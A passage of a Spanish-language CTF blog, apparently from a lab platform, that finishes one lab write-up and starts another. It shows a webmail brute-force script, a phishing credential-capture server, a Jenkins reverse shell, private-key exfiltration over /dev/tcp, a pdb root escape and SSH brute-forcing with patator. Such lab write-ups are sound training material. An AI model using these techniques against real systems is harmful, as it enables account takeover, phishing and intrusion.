        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">?_task=login</span><span class="sh">'</span><span class="p">,</span>
                          <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">_task</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">_timezone</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Europe/Madrid</span><span class="sh">"</span><span class="p">,</span>
                                <span class="sh">"</span><span class="s">_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">_user</span><span class="sh">"</span><span class="p">:</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">_pass</span><span class="sh">"</span><span class="p">:</span> <span class="n">login</span><span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
                          <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>

        <span class="nf">if </span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Succes with %s:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">login</span><span class="p">))</span>
            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Code: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> - passw: </span><span class="si">{</span><span class="n">login</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">verify</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="nf">if</span><span class="p">(</span><span class="n">token</span> <span class="o">==</span> <span class="sh">""</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">mur.txt</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">%d passwords loaded</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">passwords</span><span class="p">)))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Trying with username %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="nf">verify</span><span class="p">()):</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
    <span class="n">pool</span> <span class="o">=</span> <span class="nc">ThreadPool</span><span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">threads</span><span class="sh">'</span><span class="p">])</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="n">brute</span><span class="p">,</span> <span class="n">passwords</span><span class="p">)</span>
    <span class="n">pool</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">pool</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The End</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Lo ejecutamos usando 25 hilos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python brute.py <span class="nt">-t</span> 25
...
Code: 401 - passw: Mur_5901990
Code: 401 - passw: 05199090
Code: 401 - passw: Mur99051990
Succes with mur.rusko@phisermansphriends.thl:MurRusko_90
Code: 401 - passw: Rusko1990
Code: 401 - passw: Rusko05
...
</code></pre></div></div>

<p>Encontramos la clave de acceso de <strong>mur.rusko</strong> para el servicio de mail.</p>

<p>Ahora vamos intentar hacer phishing para obtener las credenciales de <strong>intranet.phisermansphriends.thl</strong>.</p>

<p>Primero ponemos a la escucha un servidor en python que acepte <strong>GET</strong> y POST:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>

<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/index.html</span><span class="sh">'</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">file_path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">file_path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">.html</span><span class="sh">'</span><span class="p">):</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
                <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
        <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">404 Not Found</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-type</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">text/plain</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Received POST request with body: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">body</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">run_server</span><span class="p">():</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="sh">''</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">httpd</span> <span class="o">=</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">server_address</span><span class="p">,</span> <span class="n">RequestHandler</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Server running on port 80...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">httpd</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">run_server</span><span class="p">()</span>
</code></pre></div></div>

<p>Nos guardamos la web de login para mandar al admin</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://intranet.phisermansphriends.thl/login <span class="nt">-o</span> index.html
</code></pre></div></div>

<p>Y nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
Server running on port 80...
</code></pre></div></div>

<p>Ahora vamos a mandarle un email a admin desde el servicio de mail:</p>

<p><img src="/assets/images/phisermans/1.png" alt="image" /></p>

<p>Ahora esperamos a que nos responda el admin:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
Server running on port 80...
10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:29:54] <span class="s2">"GET / HTTP/1.1"</span> 200 -
10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:30:09] <span class="s2">"POST / HTTP/1.1"</span> 200 -
b<span class="s1">'j_username=admin&amp;j_password=RqykJVKDt2RBjnR2q1zeIMYm&amp;from=%2F&amp;Submit='</span>
</code></pre></div></div>

<p>Nos logeamos en intranet con las credenciales que acabamos de conseguir.</p>

<p><img src="/assets/images/phisermans/2.png" alt="image" /></p>

<p>Como sabemos, podemos obtener una reverse shell ejecutando un script escrito en Groovy desde Jenkins. En esta máquina solo podemos obtener la shell usando el puerto <strong>443</strong>, ya que el resto de puertos están cerrados.</p>

<p><img src="/assets/images/phisermans/3.png" alt="image" /></p>

<p>Obtenemos la shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 49810

script /dev/null <span class="nt">-qc</span> bash
jenkins@phisermansphriends:~<span class="nv">$ </span>^Z
</code></pre></div></div>

<p>Hacemos el tratamiento de la TTY y estamos dentro del sistema.</p>

<p>Miramos que usuarios hay en el sistema y vemos que hay 2 usuarios más además de el usario root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
mur:x:1000:1000:Mur Rusko,,,:/home/mur:/bin/bash
jenkins:x:106:115:Jenkins,,,:/var/lib/jenkins:/bin/bash
sysadmin:x:1001:1001:sysadmin,,,:/home/sysadmin:/bin/bash
</code></pre></div></div>

<p>Vamos a probar a reusar la pass de <strong>mur.rusko</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span>su mur
Contraseña: 
mur@phisermansphriends:/var/lib/jenkins<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que ha funcionado, listamos el home del usuario y vemos un fichero <strong>.password</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:/var/lib/jenkins<span class="nv">$ </span><span class="nb">cd</span> ~
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwx------ 3 mur  mur  4096 ago 30 04:54 <span class="nb">.</span>
drwxr-xr-x 5 root root 4096 ago 30 03:50 ..
lrwxrwxrwx 1 mur  mur     9 ago 30 03:40 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 mur  mur   220 ago 29 14:23 .bash_logout
<span class="nt">-rw-r--r--</span> 1 mur  mur  3526 ago 29 14:23 .bashrc
drwxr-xr-x 3 mur  mur  4096 ago 30 03:55 .local
<span class="nt">-r--------</span> 1 mur  mur    34 ago 30 04:54 .password
<span class="nt">-rw-r--r--</span> 1 mur  mur   807 ago 29 14:23 .profile
<span class="nt">-r--------</span> 1 mur  mur    33 ago 30 03:55 user.txt
</code></pre></div></div>

<p>Lo abrimos y vemos lo que parece una contraseña de un script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .password 
<span class="k">if </span>password <span class="o">!=</span> <span class="s1">'SuperSecretPass'</span>:
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Enumeramos si puede ejecutar algún comando como root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mur on phisermansphriends:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User mur may run the following commands on phisermansphriends:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/util.py
</code></pre></div></div>

<p>Vemos que no podemos leer el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
total 4
<span class="nt">-r--------</span> 1 root root 1751 ago 30 04:41 util.py
</code></pre></div></div>

<p>Probamos a ejecutarlo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
Escuchando en localhost:443
</code></pre></div></div>

<p>Lo único que vemos es que esta a la escucha en localhost en el puerto 443.</p>

<p>Intentamos conectarnos por SSH pero vemos que no podemos conectarnos usando la password;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mur@10.0.2.15 
mur@10.0.2.15: Permission denied <span class="o">(</span>publickey<span class="o">)</span><span class="nb">.</span>
</code></pre></div></div>

<p>Generamos las claves publica/privada y la añadimos al fichero <strong>authorized_keys</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096

mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/id_rsa.pub <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">chmod </span>600 ~/.ssh/authorized_keys
</code></pre></div></div>

<p>Nos mandamos a nuestra máquina la clave privada, pero por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mandamos por el puerto 443</span>
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .ssh/id_rsa <span class="o">&gt;</span> /dev/tcp/10.0.2.5/443

<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> id_mur
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 43688
</code></pre></div></div>

<p>Le cambiamos los permisos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_mur
</code></pre></div></div>

<p>Y nos conectamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_mur mur@10.0.2.15
Linux phisermansphriends.thl 6.1.0-23-amd64 <span class="c">#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64</span>
.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. .-. <span class="nb">.</span>  <span class="nb">.</span> .-. <span class="nb">.</span> <span class="nb">.</span> .-. 
|-<span class="s1">' |-|  |  `-. |-  |(  |\/| |-| |\| `-. 
'</span>   <span class="s1">' ` `-'</span> <span class="sb">`</span>-<span class="s1">' `-'</span> <span class="s1">' '</span> <span class="s1">'  ` ` '</span> <span class="s1">' ` `-'</span>
.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. 
|-<span class="s1">' |-| |(   |  |-  |\| |  )`-. 
'</span>   <span class="s1">' ` '</span> <span class="s1">' `-'</span> <span class="sb">`</span>-<span class="s1">' '</span> <span class="sb">`</span> <span class="sb">`</span>-<span class="s1">' `-'</span> 
Last login: Thu Aug 29 15:11:20 2024
mur@phisermansphriends:~<span class="err">$</span>
</code></pre></div></div>

<p>Ahora ya podemos conectarnos al socket:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>telnet localhost 443
Trying ::1...
Connection failed: Conexión rehusada
Trying 127.0.0.1...
Connected to localhost.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
Password: SuperSecretPass
Hola admin!

Que hacemos: 
<span class="o">[</span>1] Ver procesos
<span class="o">[</span>2] Ver espacio libre
<span class="o">[</span>3] Ver sockets
<span class="o">[</span>4] Salir
h
</code></pre></div></div>

<p>Metemos la clave que habíamos encontrado y en provocamos un fallo introduciendo un carácter en vez de un dígito.  Como vemos en la otra terminal, donde ejecutamos el socket, que nos muestra un error. La librería Pdb tiene un modo interactivo que nos permite ejecutar código en python. Entramos con interactive y abrimos una shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
invalid literal <span class="k">for </span>int<span class="o">()</span> with base 10: b<span class="s1">'h'</span>
<span class="o">&gt;</span> /opt/util.py<span class="o">(</span>29<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
-&gt; option <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
<span class="o">(</span>Pdb<span class="o">)</span> interact
<span class="k">*</span>interactive<span class="k">*</span>
<span class="o">&gt;&gt;&gt;</span> import pty
<span class="o">&gt;&gt;&gt;</span> pty.spawn<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
root@phisermansphriends:/home/mur#
</code></pre></div></div>

<p>Espero que os haya gustado.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="profesional" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">r00tless</title><link href="/posts/r00tless/" rel="alternate" type="text/html" title="r00tless" /><published>2024-09-02T00:00:00+00:00</published><updated>2024-09-02T00:00:00+00:00</updated><id>/posts/r00tless</id><content type="html" xml:base="/posts/r00tless/"><![CDATA[<p><img src="/assets/images/r00tless/r00tless.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que use el modo agresivo <code class="language-plaintext highlighter-rouge">-T 4</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.18.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-T</span> 4 <span class="nt">-v</span> 172.18.0.2
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
</code></pre></div></div>

<p>Vemos que tiene los puertos <strong>22, 80, 139, 445</strong> abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,139,445 <span class="nt">-v</span> 172.18.0.2
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 fa:7b:d3:96:f6:83:bb:bd:24:86:b4:a8:f6:59:c3:62 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 29:49:38:ae:44:75:d8:88:2a:b6:98:55:00:bd:24:76 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Subir Archivo
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
</code></pre></div></div>

<p>Enumeramos <strong>samba:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nt">-a</span> 172.18.0.2
Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        read_only_share Disk      
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>64a2dd61671c server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>

S-1-22-1-1000 Unix User<span class="se">\r</span>oot-false <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1001 Unix User<span class="se">\s</span>ambauser <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1002 Unix User<span class="se">\l</span>ess <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1003 Unix User<span class="se">\p</span>asssamba <span class="o">(</span>Local User<span class="o">)</span>
</code></pre></div></div>

<p>Entre otras cosas encontramos un recurso compartido, <strong>read_only_share</strong>, y cuatro usuarios: <strong>root-false, sambauser, less y passsamba</strong>.</p>

<p>Ahora pasamos a enumerar el servicio web. Primero hacemos un ataque de fuerza bruta para encontrar directorios y ficheros:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.18.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php,.txt,.zip
200      GET        1l       10w       56c http://172.18.0.2/upload.php
200      GET       94l      183w     2410c http://172.18.0.2/
200      GET        2l       16w       78c http://172.18.0.2/readme.txt
</code></pre></div></div>

<p>Llama la atención el fichero <strong>readme.txt</strong>. Lo vemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.18.0.2/readme.txt

It may be that the file that is being uploaded is being uploaded <span class="k">in </span>a .ssh/?
</code></pre></div></div>

<p>Parece que la url <a href="http://172.18.0.2/upload.php"><strong>http://172.18.0.2/upload.php</strong></a> sube el fichero al directorio <strong>.ssh</strong> de alguno de los usuarios que hemos descubierto. Vamos a crear un par de claves públicas/privadas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creamos las claves</span>
<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096

<span class="c"># Creamos el fichero authorized_keys</span>
<span class="nv">$ </span><span class="nb">cat </span>id.pub <span class="o">&gt;</span> authorized_keys
</code></pre></div></div>

<p>Subimos el fichero <strong>authorized_keys:</strong></p>

<p><img src="/assets/images/r00tless/1.png" alt="image" /></p>

<p>No sabemos a que usuario pertenece el directorio <strong>.ssh.</strong> En este caso voy a usar el script <strong>patator</strong>. Primero creamos un fichero <strong>users.txt</strong> con los nombres de los usuarios que hemos descubierto y después ejecutamos el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">keyfile</span><span class="o">=</span><span class="nb">id </span><span class="nv">0</span><span class="o">=</span>users.txt
23:37:20 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:37:20 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
